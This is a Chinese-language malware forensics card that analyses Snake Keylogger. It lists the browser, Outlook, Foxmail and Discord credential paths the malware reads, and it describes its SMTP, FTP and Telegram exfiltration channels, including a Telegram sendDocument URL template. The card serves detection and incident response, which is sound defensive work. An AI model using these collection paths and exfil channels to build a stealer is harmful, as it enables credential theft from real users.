---
id: defense-forensics-snake-keylogger-stealer-collection-exfil-channels
title: Snake Keylogger 窃密面与三条外传通道：浏览器 Login Data、Outlook/Foxmail、Discord token，FTP/SMTP/Telegram 回传
type: scenario
domain: defense
path: defense/forensics
technique: snake-keylogger-collection-exfil-channels
tags:
- defense
- forensics
- malware
- snake-keylogger
- stealer
- credential-access
- discord-token
- foxmail
- outlook
- ftp
- smtp
- telegram
- keylogger
- mitre-attack
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V303
  verified_at: '2026-11-08T11:56:04+08:00'
  notes: 已对照原文与图08-15/38-45/49-54核对：QQ/Chrome Login Data、Yandex Ya Login Data、Outlook Snake Tracker、Foxmail 杀进程+注册表+Account.rec0、Discord leveldb token、$%SMTPDV$/%FTPDV$/$%TelegramDv$ 三通道、截图/键盘钩子/杀安全进程/MoveFileEx 均与原文一致；MITRE 额外映射为按行为合理补充。未运行样本复现
url: /docs/defense/forensics/defense-forensics-snake-keylogger-stealer-collection-exfil-channels/
draft: false
kb_aliases:
- Snake Keylogger 窃密
- Snake Tracker
- 浏览器 Login Data 窃取
- Foxmail Account.rec0
- Discord leveldb token
- FTP SMTP Telegram 外传
- Snake 键盘记录
---

## 一句话结论

Snake Keylogger 在受害机读取 Chromium/QQ/Yandex 浏览器的 `Login Data`、Outlook 账户、Foxmail 的 `Accounts\Account.rec0`、Discord `Local Storage\leveldb` 中的 token，把结果拼成带 `Snake Tracker` 标记的文本；外传方式由配置值 `$%SMTPDV$`/`%FTPDV$`/`$%TelegramDv$` 决定，分别走 SMTP 邮件附件、FTP `STOR` 或 Telegram `sendDocument`，同时伴随屏幕截图、剪贴板监听、全局键盘钩子、结束安全软件进程和把自身移到 `%TEMP%\tmpG<毫秒>.tmp`。

## 原理

- **浏览器凭据**：样本直接打开 Chromium 系浏览器的 `User Data\Default\Login Data`（SQLite，`logins` 表存 `origin_url/username_value/password_value`），原文在 Chrome 与 Tencent QQBrowser 路径均命中；Yandex 使用 `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Ya Login Data`，读取 `logins` 表后用 `smethod_6`（DPAPI 解密）或 `smethod_50`（Chromium 的 AES 密钥解密）还原 `password_value`；用户名/密码都非空才记录。
- **Outlook**：`Class8.smethod_1()` 返回 `RecoveredApplicationAccount` 列表，`smethod_0()` 把每个账户拼成：
  `\r\n------- Snake Tracker -------\r\nFound From: Outlook\r\nURL: ...\r\nE-Mail: ...\r\nPSWD: ...`，追加到全局 `Class6.string_0`。
- **Foxmail**：先 `Process.GetProcessesByName("Foxmail")` 并逐个 `Kill()`，`Thread.Sleep(5000)` 等文件释放；读注册表 `SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command` 得到安装路径，拼 `Storage\`，遍历账户目录，读取 `Accounts\Account.rec0` 解析账户信息。
- **Discord token**：读 `%APPDATA%\discord\Local Storage\leveldb\`，`smethod_69` 判断/处理，`Thread.Sleep(100)` 后 `smethod_71` 从 `.log` 提取 token，拼 `Found From: Discord\r\nToken: ...`；拿到 token 后可无密码登录受害者 Discord。
- **外传选择**：`Class6.string_4` 是配置中的通道选择，比较 `$%SMTPDV$`、`%FTPDV$`、`$%TelegramDv$` 三个常量。
  - **SMTP**：`MailMessage`，`From = string_15`、`To = string_18`，主题 `Pc Name: <用户名> | Snake Tracker`，正文 `PW | <用户名> | Snake`，附件为 `Passwords`/`User`（`smethod_42/43` 生成），`SmtpClient(string_17)`，按 `string_13` 决定 `EnableSsl`，端口 `string_19`，`NetworkCredential(string_15,string_16)`，`Send()`。
  - **FTP**：`FtpWebRequest.Create(string_22 + <机器名> + " - Passwords ID - " + string_26)`，`Method = "STOR"`，`NetworkCredential(string_20,string_21)`，上传 `PW | <用户名> | Snake` + 窃取数据；截图通道用 `" - Screenshot Logs ID - "` 命名并上传后 `File.Delete`。
  - **Telegram**：拼接 `https://api.telegram.org/bot<string_23>/sendDocument?chat_id=<string_24>&caption=Pc Name: <用户名> | Snake Tracker...`，上传文件名为 `SnakePW`、Content-Type `application/x-msdos-executable`。
- **附件行为**：
  - 屏幕截图：`%USERPROFILE%\Documents\SnakeKeylogger\Screenshot.png`，`Graphics.CopyFromScreen` 抓全屏，保存后由 `smethod_34/35` 上传。
  - 键盘记录：`KeyLogger` 类用 `SetWindowsHookExA` 安装全局键盘钩子，`KeyDown`/`KeyUp` 事件，`IdentifyKey` 处理 Backspace/Tab/Enter/Space/End/Delete/F1 等特殊键，并记录 `CurrentWindow`。
  - 剪贴板监听、结束安全软件进程（`McShield`、`avconsol`、`avsynmgr`、`avcmd`、`MsMpEng`、`MSASCui`、`Avira.Systray` 等名单）、`MoveFileEx` 把自身移到 `%TEMP%\tmpG<毫秒>.tmp`（flags 8）。
- **MITRE ATT&CK 映射**：T1555.003（浏览器凭据）、T1552.001（文件中的凭据）、T1518（软件发现）、T1071.003（邮件协议）、T1016（网络配置发现）、T1056.001（键盘记录）、T1113（屏幕截图）、T1115（剪贴板）、T1562.001（削弱防御，杀安全进程）。

## 触发条件

- 样本在 Windows 上以用户权限运行（部分行为需读取用户目录/注册表）；原样本通过钓鱼邮件附件投递（`pago.4094.r09` RAR 内 `pago 4094.exe`）。
- 受害机存在 Chromium/QQ/Yandex 浏览器、Outlook/Foxmail 或 Discord 客户端，才有对应的凭据可偷。
- 配置中已写入外传通道与 SMTP/FTP/Telegram 凭据；网络可达对应服务器（SMTP 587、FTP 21、api.telegram.org）。
- 分析侧需要隔离虚拟机/沙箱与 Sysmon/EDR/PCAP 证据。

## 利用步骤

（以下为分析/取证流程，不是执行恶意软件的操作步骤）

1. 在隔离环境运行样本或读取沙箱报告，记录进程树、释放文件、注册表写入与网络连接。
2. 按路径检查凭据访问痕迹：`Login Data`/`Ya Login Data`、`Account.rec0`、`discord\Local Storage\leveldb`。
3. 用 Sysmon Event 11/1/23 或 EDR 文件访问日志，按上述路径与进程名筛选；浏览器凭据读取通常表现为对 `Login Data` 的 `FILE_READ_DATA`。
4. 检查网络：SMTP 587/25 外连、FTP 21、`api.telegram.org`、`checkip.dyndns.org` 外部 IP 查询。
5. 检查进程终止：安全软件进程名被 `Kill()`；检查 `%TEMP%\tmpG*.tmp` 自我移动痕迹。
6. 用配置解密卡 [[code-analysis-reverse-windows-snake-keylogger-des-ecb-md5-key-config]] 解出 SMTP/FTP/Telegram 服务器、账号、收件人，作为 IOC 与阻断依据。
7. 关联 ANY.RUN 等沙箱的威胁标签（SNAKEKEYLOGGER、Snake Keylogger Exfil via SMTP）与 MITRE 映射，形成事件报告。

## PoC

无可执行 PoC（恶意软件分析场景）。取证时可用的关键路径/常量清单：

```text
# 浏览器
%LOCALAPPDATA%\<Chrome|Tencent\QQBrowser>\User Data\Default\Login Data
%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Ya Login Data

# 邮件客户端
%USERPROFILE%\Documents\SnakeKeylogger\Screenshot.png
Foxmail: HKLM\SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command
         <install>\Storage\<account>\Accounts\Account.rec0

# Discord
%APPDATA%\discord\Local Storage\leveldb\*.log

# 外传配置值
$%SMTPDV$ / %FTPDV$ / $%TelegramDv$

# 自身移动
Path.GetTempPath() + "\tmpG" + DateTime.Now.Millisecond + ".tmp"

# 典型外传
SMTP:      <smtp_server>:587, Subject "Pc Name: <user> | Snake Tracker"
FTP:       STOR "<machine> - Passwords ID - <random>"
Telegram:  https://api.telegram.org/bot<token>/sendDocument?chat_id=<id>&caption=...
```

## 变体与关联

- **同族窃密木马**：[[defense-forensics-redline-stealer-collection-geofence]] 是 RedLine Stealer 的收集面（浏览器 Login Data/Autofill、Telegram tdata、Discord leveldb、Steam/钱包、FileZilla）；本卡是 Snake Keylogger 的具体路径与三条外传通道，样本不同、C2 配置不同。
- **邮件投递链**：[[pentest-initial-access-spf-missing-sender-spoofing]]、[[defense-forensics-email-header-spoof-detection]] 覆盖钓鱼邮件与 SPF/DKIM/DMARC 识别；本文样本以 RAR 附件 `pago.4094.r09` 投递。
- **键盘记录取证**：Linux input_event 键盘记录还原见 [[ctf-forensics-linux-input-event-keylogger-decode]]；本卡的 Windows 全局钩子（`SetWindowsHookExA`）是另一实现。
- **配置解密**：见 [[code-analysis-reverse-windows-snake-keylogger-des-ecb-md5-key-config]]。
- **边界**：不同 Snake 版本路径/字段可能变化；DPAPI 解密依赖受害者用户上下文，离线取证需用户 masterkey；Chromium v80+ 的 AES-GCM 解密需要 Local State 中的加密密钥。

## 检测与防御

- **文件访问监控**：重点监控对 `Login Data`、`Ya Login Data`、`Account.rec0`、`discord\Local Storage\leveldb` 的读取，尤其是非浏览器进程；Sysmon/EDR 规则可按路径 + 进程名（pago/临时 exe）过滤。
- **网络阻断**：限制终端直连外部 SMTP 587/25、FTP 21 与 Telegram API；对 `checkip.dyndns.org`、异常 `api.telegram.org/bot` 请求告警；邮件网关拦截 `Snake Tracker` 主题/附件名。
- **进程与防御**：监控安全软件进程被终止、`SetWindowsHookEx` 全局键盘钩子、`Graphics.CopyFromScreen` 截图；启用篡改保护/EDR 自保护。
- **凭据保护**：浏览器主密码/企业策略、Windows Credential Guard、Discord 开启 2FA 并定期吊销 token；发现外传后立即重置相关账号。
- **取证与响应**：保留样本、网络 PCAP、`CLR_v4.0_32\UsageLogs\pago 4094.exe.log`、`%TEMP%\tmpG*.tmp` 与截图目录；按 IOC 全网排查；不要在生产机运行样本。
- **合规**：仅在授权/隔离环境分析；报告中的账号口令需脱敏。
